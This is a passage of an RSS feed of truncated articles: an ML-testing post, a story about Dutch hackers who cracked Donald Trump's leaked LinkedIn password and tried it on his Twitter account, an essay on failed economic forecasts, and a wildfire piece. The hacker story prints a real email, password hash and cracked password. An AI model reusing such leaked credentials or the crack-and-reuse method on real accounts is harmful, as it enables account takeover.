        <span>pred</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
        <span>pred_binary</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>pred</span><span>)</span>
        <span>acc_list</span><span>.</span><span>append</span><span>(</span><span>accuracy_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred_binary</span><span>))</span>
        <span>auc_list</span><span>.</span><span>append</span><span>(</span><span>roc_auc_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred</span><span>))</span>

    <span>assert</span> <span>sorted</span><span>(</span><span>acc_list</span><span>)</span> <span>==</span> <span>acc_list</span><span>,</span> <span>'Accuracy should increase as tree depth increases.'</span>
    <span>assert</span> <span>sorted</span><span>(</span><span>auc_list</span><span>)</span> <span>==</span> <span>auc_list</span><span>,</span> <span>'AUC ROC should increase as tree depth increases.'</span>
</code></pre></div></div>

<h2 id="post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</h2>

<p>In post-train tests, we want to <strong>check if the model is behaving ‚Ä¶</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/testing-ml/">https://eugeneyan.com/writing/testing-ml/</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/testing-ml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523930</guid>
            <pubDate>Sat, 19 Sep 2020 01:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How three Dutch hackers gained access to Donald Trump‚Äôs Twitter account]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522345">thread link</a>) | @arianvanp
<br/>
September 18, 2020 | https://www.vn.nl/hackers-twitter-trump-english/ | <a href="https://web.archive.org/web/*/https://www.vn.nl/hackers-twitter-trump-english/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2016, three Dutch hackers &nbsp;got hold of Donald Trump‚Äôs Twitter password. It wasn‚Äôt the launch codes of a nuclear missile, but it came pretty close: one tweet could jeopardize world peace, or prevent Trump from becoming president. How does one handle this amount of responsibility?</p><section id="article-body" data-article-content-element="" data-article-uid="480201" data-restricted="false"><div data-article-content-target=""><p>On October 27, 2016 three middle-aged men were gathered in a room in Hotel Cathedral in the center of Ghent. All three typing away on a laptop.<br> ‚ÄúUh oh‚Äù, one of them said.</p><p>A Twitter login screen displayed the Twitter handle @realdonaldtrump alongside a few password dots. Twitter also asked for an email address verification. ‚ÄòDonaldtrump@trump.com‚Äô didn‚Äôt work, an error message appeared. And the login attempt failed. Remarkably, in a way that had not been foreseen. The email address was incorrect, the password however, matched!<br> ‚ÄúDid you use a VPN?‚Äù<br> ‚ÄúNo. I didn‚Äôt think the password would work‚Äù.</p><blockquote><p>Was this a cyber-attack on an American presidential candidate?</p></blockquote><p>All three of them realized what this meant. The login attempt had been made using the hotel‚Äôs Wi-Fi. The Twitter log files now showed that there had been an attempt to log in on the account, from their hotel, using Donald Trump‚Äôs legitimate password. And these logfiles would undoubtedly be transferred to the U.S. intelligence services.</p><p>It could be perceived as a cyber-attack on an American presidential candidate.</p><p>Something that could get them into trouble and ruin their reputation, something they could not afford to let happen.</p><h5>Grumpy old hackers</h5><p>I first met with Edwin, Mattijs and Victor in June, in Amsterdam-Noord. ‚ÄúUp the stairs, first door on the left‚Äù. I enter a James-Bond-like setting, a room with high windows and a view of the IJ river, a dock with a drilling tower and a Russian polar ship. The three men are sitting at a large conference table. On the table, a few bottles of Club-Mate, the hacker‚Äôs preferred beverage.</p><p>It is immediately noticeable that the three of them are close. They have some resemblance to members of a rock band. Victor the talkative guitarist, Mattijs the thoughtful bass player and Edwin the grumpy drummer, who occasionally intervenes when the conversation tends to stray. All three are members of the GGOH ‚Äì <em>The Guild of Grumpy Old Hackers</em>. Their <a href="http://ggoh.info/">website</a> displays an image with eight pirates and a bitcoin address. ‚ÄúNo one has ever transferred a single bitcoin to us, though‚Äù.</p><p>The GGOH has about ten members: ‚ÄòElite‚Äô older hackers. Everyone has their own specialism. They do things the police or the army won‚Äôt or can‚Äôt do. They carry information they can‚Äôt ever share. They have decent day time jobs. Large corporates hire Edwin and Mattijs to help them with their information security. Victor is employed by a government agency. At night, however ‚Äì they run ‚Äòprojects‚Äô. They love algorithms and the law, because where there are rules, mistakes happen. ‚ÄúLoopholes. Forgotten things.‚Äù says Edwin, ‚ÄúSuch as the fact that churches have access to the municipal personal records database. Somewhat weird. The kind of thing that will trigger us to start a church of our own.‚Äù</p><blockquote><p>‚ÄúYes, the three of us could immobilize the country. And so could you. By yourself.‚Äù</p></blockquote><p>They aim to locate these mistakes before criminals, spies and terrorists do. And while doing so, they come across the craziest things. Such as bridges that can be opened via the internet, telescopic traffic bollards that can rise from the pavement using a laptop and pension funds that can be accessed with very limited difficulty. They are very careful to not mention specific examples. Mainly because of signed confidentiality agreements with clients. But also to not give others any ideas. ‚ÄúYes, the three of us can immobilize the country‚Äù, says Mattijs, ‚Äúbut so can you, by yourself‚Äù.</p><p>In order to securely exchange information with colleagues working in information security, they attend hacker conferences such as BlackHat and DEF CON in Las Vegas, BruCON in Ghent and the Chaos Communication Congress in Leipzig, where I first heard about their story. ‚ÄúDutch hackers hacked Trump‚Äôs Twitter account just before the 2016 elections‚Äù, someone there said.</p><p>Within a small bubble of the hacker community it was known who they were. And after a few months of strong persistence, the grumpy hackers agreed to speak with me. I was allowed to write up this story, on the sole condition that I would only mention their first names.</p><h5>Digital treasure trove</h5><p>In October 2016, the grumpy hackers attended another hacker conference. One they never miss: BruCON, held in the Aula Academica in Ghent, a nineteenth-century neoclassical building with Corinthian columns and a small lecture hall in the shape of an arena.</p><p>‚ÄúWe normally sit center downstairs, a little towards the back‚Äù, says Victor, ‚ÄúWe do that mostly for me. I don‚Äôt like any hustle and bustle around me, and I also like to keep a little oversight. We listen to the talks and dig around on our machines a little bit in the meantime. But this time we were on the second floor, very high up. On very unpleasant wooden benches. And then there was a talk from someone I personally like very much, but the presentation contained incredibly annoying sheep sounds. Really. Every single slide: m√®√®h. So then Edwin said, ‚ÄòYo that stolen LinkedIn data file has now been made publicly available‚Äô. That‚Äôs pretty cool, let‚Äôs go check it out‚Äù.</p><p>And so, accompanied by sheep chatter, the grumpy old hackers left the auditorium to go take a look at the LinkedIn file.</p><p>Everyone in information security had heard about ‚Äòthat LinkedIn database‚Äô. A digital treasure trove with 120 million usernames and hashes of passwords (see insert below to this piece). The loot of a digital burglary in 2012. The mastermind was Yevgeni Nikulin. Google his name and you will find his picture near a Lamborghini parked in front of the Basilius Cathedral on the Red Square in Moscow.</p><p>According to the lawsuit documentation now pending against him in the United States, he managed to get LinkedIn employees to click a link in an email and infected their computers with malware. Through these computers Nikulin managed to gain access to the internal LinkedIn network.</p><h5>Dark market</h5><p>Nikulin made a ton of money selling information to people in a secret criminal network. It is no coincidence that shortly after the LinkedIn break-in, Donald Trump‚Äôs Twitter account was hacked. On 21 February 2013, song lyrics by rapper Lil‚Äô Wayne appeared on Trump‚Äôs Twitter account. Trump, who had ‚Äòonly‚Äô two million followers at the time, reacted immediately:</p><p>‚ÄòMy Twitter has been seriously hacked ‚Äì and we are looking for the perpetrators‚Äô.</p><p>It wasn‚Äôt until the summer of 2016 that the LinkedIn file popped up on the black market. For 5 bitcoins ‚Äì at that time the equivalent of about three thousand euros ‚Äì it was offered on The RealDeal, a well-known dark market. This seemed very appealing to the grumpy old hackers.</p><p>‚ÄúWhen you are responsible for the information security of a large company or a government agency, you will want access to such a database to see if it contains data of people from your own organization. Three thousand euros isn‚Äôt much for a database like this. If you only knew how many intelligence services would be willing to pay for this‚Äù, says Victor. ‚ÄúHowever, buying stolen data is a criminal offense. It is illegal, and we wouldn‚Äôt ever consider doing that. We‚Äôre not keen on financially aiding criminals. Also, the police access the dark markets too. They can identify buyers. It was absolutely out of the question for us to acquire that file‚Äù.</p><blockquote><p>Mark Rutte was on that list. So was Mark Zuckerberg.</p></blockquote><p>Security researchers who infiltrated criminal networks got their hands on the database, regardless. Within the information security community, these types of files are shared in order to better test one‚Äôs own security. Something that is impossible to do out in the open.</p><p>Edwin was the first to receive a link, which he immediately shared with Mattijs and Victor. They quickly left for the hotel to quietly conduct further research.</p><p>‚ÄúI instantly found my director‚Äôs password in there‚Äù, says Victor, ‚ÄúI sent him a brief message, saying ‚Äòlook, it‚Äôs your password‚Äù. Dutch Prime Minister Mark Rutte was on the list. And so was Mark Zuckerberg (‚Äòdadada‚Äô ‚Äì turned out afterwards that the password for his facebook account was ‚Äòtadada‚Äô).</p><h5>‚ÄòEthical hackers‚Äô</h5><p>A week and a half prior to the US elections, everyone in the information security domain was talking about Trump‚Äôs Twitter account. It was the most wanted target in the world. From hacktivists to foreign intelligence agencies, they were all out for that account. It was therefore very instinctive to check if Donald Trump was also in the database.</p><p>And he was, right there.<br> email: donaldtrump@trump.com<br> password hash: 07b8938319c267dcdb501665220204bbde87bf1d</p><p>Using the program John the Ripper ‚Äì a tool hackers use to crack hashes ‚Äì Mattijs identified the password in less than a second: yourefired</p><p>Edwin was typing it in before anyone could say anything.<br> The password was accepted, and as an extra verification step an email address had to be entered.<br> But the entered address was incorrect.</p><p>Edwin almost fell off his chair. It meant that Trump hadn‚Äôt changed his password after the 2013 ‚Äòhack‚Äô.<br> Which was bad news.</p><blockquote><p>There was no time to waste. If anyone else would now hack Donald Trump‚Äôs Twitter account, they were the ones to be potentially blamed.</p></blockquote><p>The grumpy old hackers knew better than anyone that the Twitter administrators would be able to see that they had made a login attempt from their hotel with the correct Donald Trump password. And also that this information would sooner or later be passed on to the U.S. intelligence services. A login attempt on Donald Trump‚Äôs Twitter account could be perceived as a cyber-attack on a U.S. presidential candidate.</p><p>So there really was only one option. The grumpy hackers would have to prove that they were real ‚Äòethical hackers‚Äô. In order to demonstrate this in an unambiguous way, however ‚Äì they would have to, ironically, break into Trump‚Äôs account. It would be the ‚Ä¶</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vn.nl/hackers-twitter-trump-english/">https://www.vn.nl/hackers-twitter-trump-english/</a></em></p>]]>
            </description>
            <link>https://www.vn.nl/hackers-twitter-trump-english/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522345</guid>
            <pubDate>Fri, 18 Sep 2020 22:06:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522322">thread link</a>) | @behoove
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You‚Äôll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte‚Äôs site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies‚Äô websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn‚Äôt stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you‚Äôll find forecasts stretching all the way to the year 2100. We‚Äôre still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let‚Äôs take a moment to look at the predictions of the past.&nbsp;Let‚Äôs see how our projections panned out.</p><h3>We can‚Äôt predict recessions</h3><p>The Economist‚Äôs ‚ÄúThe World in 2020‚Äù, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue‚Äôs predictions on 2020‚Äôs economic outlook:&nbsp;</p><blockquote><p>‚ÄúBanks, especially in Europe, will battle with negative interest rates. America will flirt with recession‚Äîbut don‚Äôt be surprised if disaster fails to strike, and markets revive.‚Äù</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn‚Äôt to know that we were on the precipice of a pandemic.&nbsp;So let‚Äôs review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;‚ÄúIn the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: ‚ÄúThe record of failure to predict recessions is virtually unblemished.‚Äù‚Äù</p></blockquote><p>It‚Äôs hard to overstate the severity of Loungani‚Äôs findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund‚Äôs predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden‚Äôs success rate of 0.85% is remarkably consistent with Longani‚Äôs.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>‚ÄúSince 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.‚Äù</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It‚Äôs clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn‚Äôt stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>‚ÄúEven with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (‚Ä¶) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.‚Äù</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn‚Äôt sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>‚Äú(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany‚Äôs economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.‚Äù</p></blockquote><p>But it isn‚Äôt just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you‚Äôd expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn‚Äôt stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>‚ÄúThe level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government‚Äôs budget.‚Äù</p></blockquote><p>With interest rates being so important to so many, it‚Äôs no surprise that an entire industry of professional predictors exists to monitor the rate‚Äôs past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions‚Äô lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That‚Äôs like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn‚Äôt a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>‚ÄúThe decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.‚Äù</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn‚Äôt stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>‚ÄúIn six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (‚Ä¶) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.‚Äù</p></blockquote><p>Gigerenzer‚Äôs own conclusion was even more clear:</p><blockquote><p>‚ÄúForecasts of dollar-to-euro exchange rates are worthless.‚Äù</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate ‚Ä¶</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522322</guid>
            <pubDate>Fri, 18 Sep 2020 22:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Climate Change Responsible for This Season's Wildfires?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521994">thread link</a>) | @amoorthy
<br/>
September 18, 2020 | https://blog.thefactual.com/climate-change-wildfires-oregon-california | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/climate-change-wildfires-oregon-california">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>
<div>


<div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The recent HBO miniseries <em>Chernobyl</em> captured a key moment in which human protagonists are confronted by the scale of a disaster. During this unprecedented man-made incident in 1986, nuclear scientists at a damaged nuclear reactor struggled to assess the danger from radiation, especially because the geiger counters on hand ‚Äî devices meant to measure levels of radiation ‚Äî <a href="https://www.jstor.org/stable/10.5612/slavicreview.74.1.104?read-now=1&amp;seq=9#page_scan_tab_contents" rel="noopener" target="_blank"><span>didn‚Äôt go high enough</span></a> to measure the amount of radiation leaking into the environment. The radiation essentially exceeded what the scientists had tools on hand to measure.</p>
<!--more-->
<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency‚Äôs 500-point AQI scale. Previously, events that put the AQI at 300 were ‚Äúextremely rare‚Äù; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn‚Äôt typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast‚Äôs mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year‚Äôs wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California‚Äôs climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn‚Äôt burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>
<p><img src="https://lh5.googleusercontent.com/zxd_ypEby-bddzFmqsD5-961ZgOYuNCl08ZrzIsbA-JrHcczJEKfI32SXmpV7vj56YKlrEHixxzC0uvbbswH1LTdWmNQwimnRzsJOJ4hfe7DfOa_yc3LKRD03j6u1e1lJRmuA4_-" width="578"></p>
<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year‚Äôs fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry ‚Äî even for fire season.&nbsp;</p></div>
<p><img src="https://lh6.googleusercontent.com/Sfqjx4sJ4aGT8ibajU93V7ZjH8HOQ8P0Th_NDP77MSdgLymRRRWv-8soEftHsKo7mmpODdIl2yHjPlGWaUWNnJLEop01ql63y_hzOWOwMZdCfJn6OW9a7tuveBEi7ECcAhyd0xhz" width="600"></p>
<div><p>This map shows how average temperatures in August 2020 contrast with the average August temperatures from 1951-1980.&nbsp; Source: <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>Discover Magazine</span></a></p></div>
<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season‚Äôs severity is clear to people on both sides of the spectrum.</p>
